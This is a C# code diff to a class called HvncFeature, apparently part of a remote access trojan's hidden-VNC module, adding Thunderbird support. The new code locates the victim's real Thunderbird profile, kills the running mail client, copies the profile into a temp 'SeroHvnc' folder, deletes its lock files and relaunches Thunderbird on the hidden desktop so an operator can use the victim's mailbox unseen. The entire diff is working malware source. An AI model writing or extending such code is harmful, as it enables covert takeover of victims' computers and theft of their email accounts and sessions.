@@ -398,6 +398,7 @@ internal static class HvncFeature
         bool launchedVivaldi  = _launchedPids.ContainsKey("vivaldi.exe");
         bool launchedChromium = _launchedPids.ContainsKey("chromium.exe");
         bool launchedFirefox  = _launchedPids.ContainsKey("firefox.exe");
+        bool launchedThunderbird = _launchedPids.ContainsKey("thunderbird.exe");
         GracefulKillBrowsers();
         // Kill each tracked process AND its entire child tree — browsers spawn renderer,
         // GPU, network-service, and utility children that TerminateProcess(parent) leaves
@@ -423,6 +424,7 @@ internal static class HvncFeature
         if (launchedVivaldi)  CleanRealBrowserLock("Vivaldi",                         "User Data");
         if (launchedChromium) CleanRealBrowserLock("Chromium",                        "User Data");
         if (launchedFirefox)  CleanFirefoxRealLocks();
+        if (launchedThunderbird) CleanThunderbirdRealLocks();
     }
 
     public static void SignalAck()
@@ -1762,6 +1764,52 @@ internal static class HvncFeature
             try { File.Delete(Path.Combine(p, lk)); } catch { }
     }
 
+    private static string? GetThunderbirdRealProfile()
+    {
+        string tbBase = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+            "Thunderbird");
+        string iniPath = Path.Combine(tbBase, "profiles.ini");
+        if (!File.Exists(iniPath)) return null;
+
+        string? bestPath    = null;
+        string? currentPath = null;
+        bool    isRelative  = true;
+        bool    isDefault   = false;
+
+        void Commit()
+        {
+            if (currentPath == null) return;
+            string full = isRelative
+                ? Path.Combine(tbBase, currentPath.Replace('/', Path.DirectorySeparatorChar))
+                : currentPath;
+            if (bestPath == null || isDefault) bestPath = full;
+        }
+
+        foreach (var line in File.ReadLines(iniPath))
+        {
+            string t = line.Trim();
+            if (t.StartsWith('['))
+            {
+                Commit(); currentPath = null; isRelative = true; isDefault = false;
+            }
+            else if (t.StartsWith("Path=",       StringComparison.OrdinalIgnoreCase)) currentPath = t[5..];
+            else if (t.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase)) isRelative  = t[11..].Trim() == "1";
+            else if (t.Equals(    "Default=1",   StringComparison.OrdinalIgnoreCase)) isDefault   = true;
+        }
+        Commit();
+
+        return bestPath != null && Directory.Exists(bestPath) ? bestPath : null;
+    }
+
+    private static void CleanThunderbirdRealLocks()
+    {
+        string? p = GetThunderbirdRealProfile();
+        if (p == null) return;
+        foreach (var lk in new[] { "parent.lock", "lock" })
+            try { File.Delete(Path.Combine(p, lk)); } catch { }
+    }
+
     private static void KillProcessByName(string exeName)
     {
         const uint TH32CS_SNAPPROCESS = 0x00000002;
@@ -1982,7 +2030,7 @@ internal static class HvncFeature
                 }
             }
             else if (!_multiInstance.Contains(exeBase) &&
-                     !_chromiumBrowsers.Contains(exeBase) && exeBase != "firefox.exe" &&
+                     !_chromiumBrowsers.Contains(exeBase) && exeBase != "firefox.exe" && exeBase != "thunderbird.exe" &&
                      _launchedPids.TryGetValue(exeBase, out uint existingPid) && IsProcessAlive(existingPid))
             {
                 StubLog.Info($"[HVNC] '{exeBase}' already running (pid={existingPid}), skipping");
@@ -2120,6 +2168,44 @@ internal static class HvncFeature
                 // Drop all server-supplied args — keep only the quoted exe, then add ours.
                 // cmd = '"C:\Program Files\...\firefox.exe" -profile ...' so we must find
                 // the CLOSING quote, not the first space (which would be inside "Program Files").
+                if (cmd.Length > 0 && cmd[0] == '"')
+                {
+                    int closeQ = cmd.IndexOf('"', 1);
+                    if (closeQ >= 0) cmd = cmd[..(closeQ + 1)];
+                }
+                else
+                {
+                    int sp = cmd.IndexOf(' ');
+                    if (sp >= 0) cmd = cmd[..sp];
+                }
+                cmd += $" -profile \"{hvncProfile}\" -no-remote";
+            }
+            else if (exeBase == "thunderbird.exe")
+            {
+                string hvncProfile = Path.Combine(Path.GetTempPath(), "SeroHvnc", "thunderbird");
+                string? realProfile = GetThunderbirdRealProfile();
+                if (cloneBrowser && realProfile != null && Directory.Exists(realProfile))
+                {
+                    KillProcessByName("thunderbird.exe");
+                    Thread.Sleep(800);
+                    try { if (Directory.Exists(hvncProfile)) Directory.Delete(hvncProfile, true); } catch { }
+                    CloneProfileWithProgress(realProfile, hvncProfile, "Cloning thunderbird...");
+                    StubLog.Info($"[HVNC] Thunderbird profile cloned '{realProfile}' → '{hvncProfile}'");
+                }
+                else
+                {
+                    if (_launchedPids.TryGetValue("thunderbird.exe", out uint oldTbPid) && IsProcessAlive(oldTbPid))
+                    {
+                        KillProcessTree(oldTbPid);
+                        _launchedPids.TryRemove("thunderbird.exe", out _);
+                        Thread.Sleep(500);
+                    }
+                    try { Directory.CreateDirectory(hvncProfile); } catch { }
+                    if (cloneBrowser) SendHvncProgress(100, "");
+                }
+                foreach (var lk in new[] { "parent.lock", "lock" })
+                    try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
+                // Drop all server-supplied args — keep only the quoted exe, then add ours.
                 if (cmd.Length > 0 && cmd[0] == '"')
                 {
                     int closeQ = cmd.IndexOf('"', 1);
